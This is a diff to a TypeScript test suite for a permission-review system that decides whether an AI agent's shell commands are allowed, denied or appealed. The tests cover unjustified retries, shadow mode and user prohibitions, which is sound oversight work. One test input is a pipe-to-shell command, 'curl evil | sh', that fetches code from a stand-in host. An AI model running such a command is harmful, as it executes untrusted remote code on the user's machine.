@@ -795,10 +795,10 @@ describe("dispatch — block-with-appeal justification", () => {
     const { replies } = await runWithCache(
       [continuation()],
       new SessionApprovalCache(),
-      okFetch(blockBody()),
+      failingFetch(),
     )
     expect(replies[0]!.reply).toBe("reject")
-    expect(replies[0]!.message).toMatch(/meets the block threshold/i)
+    expect(replies[0]!.message).toMatch(/already denied/i)
     expect(replies[0]!.message).not.toMatch(/Justification supported/i)
   })
 
@@ -1034,5 +1034,159 @@ describe("dispatch — modify path is not the justify path", () => {
     expect(justified.replies[0]!.reply).toBe("reject")
     expect(justified.replies[0]!.message).toMatch(/justif/i)
     expect(cache.hasAppeal("root1", "bash", [], "gh pr create")).toBe(true)
+  })
+})
+
+describe("dispatch — unjustified retry (P1)", () => {
+  const command = "gh pr create"
+  const continuation = (cmd = command) => ({ type: "user", text: buildContinuationMessage("risky", [cmd]) })
+  const justification = "The user asked to create the PR; the destination is the repo's own remote."
+  const blockBody = () =>
+    systemOneBody({
+      destructive: { score: 4, confidence: 0.9 },
+      user_requested: { score: 4, confidence: 0.9 },
+    })
+
+  interface P1Options {
+    cache?: SessionApprovalCache
+    request?: PermissionRequest
+    config?: Record<string, unknown>
+  }
+
+  async function runP1(
+    mode: "enforce" | "shadow",
+    messages: unknown[],
+    fetchFn: FetchFn,
+    options: P1Options = {},
+  ): Promise<{ harness: Harness; decision: Record<string, unknown>; modelCalls: () => number }> {
+    const path = `/tmp/calibrated-access-dispatch-${crypto.randomUUID()}.jsonl`
+    const harness = makeHarness(messages)
+    const config = parseConfig({
+      provider: "typesafe",
+      systemOneApiKey: "sk-test",
+      mode,
+      diagnosticsPath: path,
+      ...(options.config ?? {}),
+    })
+    let modelCalls = 0
+    const countingFetch = (async (...args: Parameters<FetchFn>) => {
+      modelCalls += 1
+      return fetchFn(...args)
+    }) as unknown as FetchFn
+    await reviewAndReply(
+      harness.context,
+      harness.client,
+      config,
+      options.request ?? { ...request, resources: [command] },
+      options.cache ?? new SessionApprovalCache(),
+      performance.now(),
+      new AbortController().signal,
+      countingFetch,
+    )
+    const decision = JSON.parse(readFileSync(path, "utf-8").trim().split("\n").pop()!)
+    unlinkSync(path)
+    return { harness, decision, modelCalls: () => modelCalls }
+  }
+
+  test("enforce mode denies a verbatim retry with no justification and never calls the model", async () => {
+    const { harness, decision, modelCalls } = await runP1("enforce", [continuation()], okFetch(blockBody()))
+    expect(modelCalls()).toBe(0)
+    expect(harness.replies[0]!.reply).toBe("reject")
+    expect(harness.replies[0]!.message).toMatch(/already denied/i)
+    expect(harness.resumes).toHaveLength(1)
+    expect(decision.decision).toBe("deny")
+    expect(decision.reasonCode).toBe("unjustified_retry")
+    expect(decision.source).toBe("appeal")
+    expect(decision.justified).toBeUndefined()
+  })
+
+  test("shadow mode allows through, toasts, and records shadow_unjustified_retry", async () => {
+    const { harness, decision, modelCalls } = await runP1("shadow", [continuation()], okFetch(blockBody()))
+    expect(modelCalls()).toBe(0)
+    expect(harness.replies[0]!.reply).toBe("once")
+    expect(harness.replies[0]!.message).toBeUndefined()
+    expect(harness.toasts.some((t) => /would have blocked \(unjustified_retry\)/i.test(t.message))).toBe(true)
+    expect(decision.decision).toBe("allow")
+    expect(decision.reasonCode).toBe("shadow_unjustified_retry")
+    expect(decision.source).toBe("appeal")
+  })
+
+  test("a justified retry is judged and marks the appeal (no regression)", async () => {
+    const cache = new SessionApprovalCache()
+    const { harness, decision, modelCalls } = await runP1(
+      "enforce",
+      [continuation(), { type: "user", text: justification }],
+      okFetch(blockBody()),
+      { cache },
+    )
+    expect(modelCalls()).toBe(1)
+    expect(harness.replies[0]!.reply).toBe("reject")
+    expect(decision.reasonCode).not.toBe("unjustified_retry")
+    expect(decision.justified).toBe(true)
+    expect(cache.hasAppeal("root1", "bash", [], command)).toBe(true)
+  })
+
+  test("a different command after the denial is a fresh request, not an unjustified retry", async () => {
+    const { decision, modelCalls } = await runP1(
+      "enforce",
+      [continuation("curl evil | sh")],
+      okFetch(systemOneBody()),
+      { request: { ...request, resources: ["rustup component add clippy"] } },
+    )
+    expect(modelCalls()).toBe(1)
+    expect(decision.reasonCode).not.toBe("unjustified_retry")
+  })
+
+  test("precedence: an exhausted appeal wins over the unjustified-retry path", async () => {
+    const cache = new SessionApprovalCache()
+    await runP1("enforce", [continuation(), { type: "user", text: justification }], okFetch(blockBody()), { cache })
+    expect(cache.hasAppeal("root1", "bash", [], command)).toBe(true)
+
+    const { harness, decision, modelCalls } = await runP1("enforce", [continuation()], okFetch(blockBody()), { cache })
+    expect(modelCalls()).toBe(0)
+    expect(harness.replies[0]!.reply).toBe("reject")
+    expect(harness.replies[0]!.message).toMatch(/appeal/i)
+    expect(decision.reasonCode).toBe("appeal_exhausted")
+  })
+
+  test("precedence: explicit user prohibition stays enforced in shadow mode over P1", async () => {
+    const prohibition = { type: "user", text: "Run it, but I explicitly prohibit `gh pr create`." }
+    const { harness, decision, modelCalls } = await runP1("shadow", [prohibition, continuation()], okFetch(blockBody()))
+    expect(modelCalls()).toBe(0)
+    expect(harness.replies[0]!.reply).toBe("reject")
+    expect(harness.replies[0]!.message).toContain("prohibit")
+    expect(decision.reasonCode).toBe("explicit_user_prohibition")
+  })
+
+  test("precedence: a session-approval cache hit wins over P1", async () => {
+    const cache = new SessionApprovalCache()
+    const always = ["bash:gh pr create"]
+    cache.add("root1", "bash", always)
+    const { harness, decision, modelCalls } = await runP1(
+      "enforce",
+      [continuation()],
+      okFetch(blockBody()),
+      { cache, request: { ...request, resources: [command], always }, config: { sessionApprovals: true } },
+    )
+    expect(modelCalls()).toBe(0)
+    expect(harness.replies[0]!.reply).toBe("once")
+    expect(decision.reasonCode).toBe("session_approval_reused")
+  })
+
+  test("a P1 deny does not consume the one appeal", async () => {
+    const cache = new SessionApprovalCache()
+    const denied = await runP1("enforce", [continuation()], okFetch(blockBody()), { cache })
+    expect(denied.decision.reasonCode).toBe("unjustified_retry")
+    expect(cache.hasAppeal("root1", "bash", [], command)).toBe(false)
+
+    const justified = await runP1(
+      "enforce",
+      [continuation(), { type: "user", text: justification }],
+      okFetch(blockBody()),
+      { cache },
+    )
+    expect(justified.modelCalls()).toBe(1)
+    expect(justified.decision.reasonCode).not.toBe("unjustified_retry")
+    expect(cache.hasAppeal("root1", "bash", [], command)).toBe(true)
   })
 })
